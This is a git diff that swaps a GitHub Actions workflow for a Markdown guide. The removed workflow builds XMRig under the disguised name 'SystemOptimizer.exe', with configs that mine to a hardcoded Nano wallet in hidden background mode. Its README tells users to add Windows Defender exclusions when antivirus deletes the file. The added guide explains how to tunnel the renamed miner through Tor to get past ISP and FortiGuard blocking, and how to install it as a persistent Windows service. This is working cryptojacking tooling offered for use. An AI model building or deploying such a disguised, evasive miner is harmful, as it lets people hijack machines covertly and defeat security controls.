@@ -1,265 +1,67 @@
-name: Build Custom XMRig for Windows
+# Bypass ISP/FortiGuard Blocking with Tor
 
-on:
-  push:
-    branches: [ master, main ]
-  pull_request:
-    branches: [ master, main ]
-  workflow_dispatch:
+## Quick Setup Guide
 
-jobs:
-  build:
-    runs-on: windows-2022
-    
-    steps:
-    - name: Checkout code
-      uses: actions/checkout@v4
-      
-    - name: Setup MSVC
-      uses: ilammy/msvc-dev-cmd@v1
-      with:
-        arch: x64
-        
-    - name: Install dependencies with vcpkg
-      run: |
-        git clone https://github.com/microsoft/vcpkg.git
-        cd vcpkg
-        .\bootstrap-vcpkg.bat
-        .\vcpkg install libuv:x64-windows-static openssl:x64-windows-static hwloc:x64-windows-static
-      shell: cmd
-      
-    - name: Customize project name
-      run: |
-        (Get-Content CMakeLists.txt) -replace 'project\(xmrig\)', 'project(SystemOptimizer)' | Set-Content CMakeLists.txt
-      shell: pwsh
-      
-    - name: Configure CMake
-      run: |
-        mkdir build
-        cd build
-        cmake .. -G "Visual Studio 17 2022" -A x64 ^
-          -DCMAKE_BUILD_TYPE=Release ^
-          -DCMAKE_TOOLCHAIN_FILE=..\vcpkg\scripts\buildsystems\vcpkg.cmake ^
-          -DVCPKG_TARGET_TRIPLET=x64-windows-static ^
-          -DWITH_HWLOC=OFF ^
-          -DWITH_HTTP=ON ^
-          -DWITH_TLS=ON ^
-          -DBUILD_STATIC=ON
-      shell: cmd
-      
-    - name: Build
-      run: |
-        cd build
-        cmake --build . --config Release --parallel
-      shell: cmd
-      
-    - name: Prepare artifacts
-      run: |
-        mkdir output
-        Copy-Item "build\Release\SystemOptimizer.exe" "output\"
-        
-        # Create config with Tor SOCKS5 proxy
-        @"
-        {
-            "autosave": true,
-            "background": true,
-            "colors": false,
-            "title": false,
-            "randomx": {
-                "init": -1,
-                "mode": "auto",
-                "1gb-pages": false,
-                "numa": true
-            },
-            "cpu": {
-                "enabled": true,
-                "huge-pages": true,
-                "priority": 1,
-                "max-threads-hint": 75,
-                "asm": true
-            },
-            "log-file": "optimizer.log",
-            "pools": [
-                {
-                    "url": "rx.unmineable.com:3333",
-                    "user": "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx",
-                    "pass": "x",
-                    "keepalive": true,
-                    "tls": false,
-                    "socks5": "127.0.0.1:9050"
-                }
-            ],
-            "print-time": 60,
-            "retries": 5,
-            "retry-pause": 5
-        }
-        "@ | Out-File -FilePath "output\config-tor.json" -Encoding UTF8
-        
-        # Create config without proxy (for testing)
-        @"
-        {
-            "autosave": true,
-            "background": false,
-            "colors": true,
-            "title": true,
-            "randomx": {
-                "init": -1,
-                "mode": "auto",
-                "1gb-pages": false,
-                "numa": true
-            },
-            "cpu": {
-                "enabled": true,
-                "huge-pages": true,
-                "priority": 1,
-                "max-threads-hint": 75,
-                "asm": true
-            },
-            "log-file": null,
-            "pools": [
-                {
-                    "url": "rx.unmineable.com:3333",
-                    "user": "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx",
-                    "pass": "x",
-                    "keepalive": true,
-                    "tls": false
-                }
-            ],
-            "print-time": 60,
-            "retries": 5,
-            "retry-pause": 5
-        }
-        "@ | Out-File -FilePath "output\config-direct.json" -Encoding UTF8
-        
-        # Create config with TLS
-        @"
-        {
-            "autosave": true,
-            "background": true,
-            "colors": false,
-            "title": false,
-            "randomx": {
-                "init": -1,
-                "mode": "auto",
-                "1gb-pages": false,
-                "numa": true
-            },
-            "cpu": {
-                "enabled": true,
-                "huge-pages": true,
-                "priority": 1,
-                "max-threads-hint": 75,
-                "asm": true
-            },
-            "log-file": "optimizer.log",
-            "pools": [
-                {
-                    "url": "rx.unmineable.com:443",
-                    "user": "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx",
-                    "pass": "x",
-                    "keepalive": true,
-                    "tls": true
-                }
-            ],
-            "print-time": 60,
-            "retries": 5,
-            "retry-pause": 5
-        }
-        "@ | Out-File -FilePath "output\config-tls.json" -Encoding UTF8
-        
-        # Create batch files
-        @"
-        @echo off
-        echo Starting System Optimizer with Tor Proxy...
-        echo.
-        echo Make sure Tor is running on port 9050!
-        echo.
-        SystemOptimizer.exe -c config-tor.json -B
-        "@ | Out-File -FilePath "output\start-with-tor.bat" -Encoding ASCII
-        
-        @"
-        @echo off
-        echo Testing System Optimizer (Direct Connection)...
-        echo.
-        echo This will show the console for testing.
-        echo Press Ctrl+C to stop.
-        echo.
-        SystemOptimizer.exe -c config-direct.json
-        "@ | Out-File -FilePath "output\start-test.bat" -Encoding ASCII
-        
-        @"
-        @echo off
-        echo Starting System Optimizer with TLS...
-        echo.
-        SystemOptimizer.exe -c config-tls.json -B
-        "@ | Out-File -FilePath "output\start-with-tls.bat" -Encoding ASCII
-        
-        # Create README
-        @"
-        # Custom XMRig Build for Nano Mining
-        
-        Pre-configured for: nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp
-        Referral code: c5g6-wmzx (0.25% bonus)
-        
-        ## Quick Start
-        
-        ### Option 1: With Tor (Bypass Blocking) - RECOMMENDED
-        
-        1. Download Tor: https://www.torproject.org/download/tor/
-        2. Run tor.exe
-        3. Double-click: start-with-tor.bat
-        
-        ### Option 2: With TLS (Alternative)
-        
-        1. Double-click: start-with-tls.bat
-        
-        ### Option 3: Test Direct Connection
-        
-        1. Double-click: start-test.bat
-        
-        ## Windows Defender Exclusion
-        
-        Add this folder to exclusions:
-        Settings → Windows Security → Virus & threat protection → Exclusions
-        
-        ## Files
-        
-        - SystemOptimizer.exe - The miner
-        - config-tor.json - With Tor SOCKS5 proxy
-        - config-tls.json - With TLS encryption
-        - config-direct.json - Direct connection
-        - start-with-tor.bat - Run with Tor
-        - start-with-tls.bat - Run with TLS
-        - start-test.bat - Test with console
-        
-        ## Monitor Mining
-        
-        Check stats at: https://unmineable.com/
-        Enter your Nano address to see earnings.
-        
-        ## Troubleshooting
-        
-        ### Connection issues
-        1. Try TLS config first (start-with-tls.bat)
-        2. If blocked, use Tor (start-with-tor.bat)
-        3. Change DNS to 1.1.1.1 and 8.8.8.8
-        
-        ### Antivirus deletes file
-        1. Add folder to Windows Defender exclusions
-        2. Re-extract files
-        
-        ### Low hashrate
-        1. Run as Administrator
-        2. Close other programs
-        3. Adjust max-threads-hint in config
-        
-        Build Date: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC")
-        "@ | Out-File -FilePath "output\README.txt" -Encoding UTF8
-      shell: pwsh
-      
-    - name: Upload artifacts
-      uses: actions/upload-artifact@v4
-      with:
-        name: SystemOptimizer-Nano-Windows-x64
-        path: output/
-        retention-days: 90
+### 1. Download Tor Expert Bundle
+- Windows: https://www.torproject.org/download/tor/
+- Download: `tor-win64-VERSION.zip`
+
+### 2. Extract and Run
+```cmd
+# Extract the zip file
+# Navigate to the Tor folder
+cd tor-win64-VERSION\Tor
+
+# Run Tor
+tor.exe
+```
+
+### 3. Verify Tor is Running
+You should see:
+```
+[notice] Bootstrapped 100% (done): Done
+[notice] Opened SOCKS listener on 127.0.0.1:9050
+```
+
+### 4. Run Miner with Proxy
+```cmd
+WinOptimizer.exe -c config.json
+```
+
+## Alternative: Tor as Windows Service
+
+### Using NSSM
+```cmd
+# Download NSSM: https://nssm.cc/download
+nssm install Tor "C:\path\to\tor.exe"
+nssm start Tor
+
+# Install miner as service
+nssm install WinOptimizer "C:\path\to\WinOptimizer.exe" "-c C:\path\to\config.json"
+nssm start WinOptimizer
+```
+
+## Testing Connection Through Tor
+
+### Check if Tor is working
+```cmd
+curl --socks5 127.0.0.1:9050 https://check.torproject.org
+```
+
+## Troubleshooting
+
+### Tor won't start
+- Check if port 9050 is already in use
+- Run as Administrator
+- Check Windows Firewall
+
+### Miner can't connect
+1. Verify Tor is running: `netstat -an | findstr 9050`
+2. Check config.json has: `"socks5": "127.0.0.1:9050"`
+3. Try without SOCKS5 first to isolate issue
+
+### Still blocked?
+Try these alternatives:
+1. Use VPN + miner (no SOCKS5 needed)
+2. Use mobile hotspot temporarily
+3. Contact pool support for alternative endpoints
